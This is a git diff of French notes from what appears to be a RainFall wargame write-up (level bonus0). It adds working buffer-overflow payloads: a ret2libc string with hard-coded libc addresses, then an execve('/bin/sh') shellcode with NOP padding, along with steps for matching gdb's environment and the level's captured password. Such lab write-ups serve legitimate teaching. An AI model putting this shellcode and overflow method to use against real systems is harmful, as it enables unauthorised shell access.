@@ -132,6 +132,7 @@ Bon, offset de `/bin/sh` dans `objdump -s /lib/i386-linux-gnu/libc-2.15.so` = `0
 donc on a l'adresse de `system` et de `/bin/sh`, testons:
 ```py
 print("A" * 4095 + "\n")
+print("A" * 9 + "\x60\xb0\xe6\xb7" + "\x90" * 4 + "\x58\xcc\xf8\xb7" + "A" * 4074 + "\x0a")
 print("0\x58\xcc\xf8\xb7\x58\xcc\xf8\xb7\x60\xb0\xe6\xb7" + "\x58\xcc\xf8\xb7" * 1019)
 ```
 
@@ -151,3 +152,33 @@ Adresse de base de retour de main est : `0xb7e454d3`. On peut analyser la return
 4. On va déclarer notre buffer à `esp + 22`, ce qui nous rapproche à 44 octets de notre adresse.
 5. En arrivant dans `pp`, on insère les adresses de retour, et on pointe sur `0xbffff6e0`, soit désormais 92 octets avant l'adresses de retour
 6. 
+
+
+Wait, après avoir cherché avec `dmesg`, j'ai vu qu'il essayé d'exécuter les adresses que je lui passais (comme de s opcode), et non d'exécuter la fonction `system`. Ce qui explique les segfault à répétitions.
+
+Après avoir testé avec `gdb`, l'adresse de notre payload dans la stack est : `0xbfffe695`
+
+Essayons de reprendre le shell code de l'exercice précédent :
+```py
+payload = ("\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70" +
+		"\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61" +
+		"\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52" +
+		"\x51\x53\x89\xe1\xcd\x80")
+print("A" * 4095)
+print("A" * 9 + "\x8e\xe6\xff\xbf\x90" + payload + "\x90" * (4094 - len(payload) - 9 - 4))
+```
+
+ATTENTION, il faut les même env que dans `gdb`, donc on fait :
+```
+(gdb) show env
+```
+On copie les env, puis dans bash:
+```
+bonus0@RainFall:~$ vim /tmp/env
+bonus0@RainFall:~$ set -a
+bonus0@RainFall:~$ source /tmp/env
+bonus0@RainFall:~$ set +a
+```
+
+Password:
+`cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9`
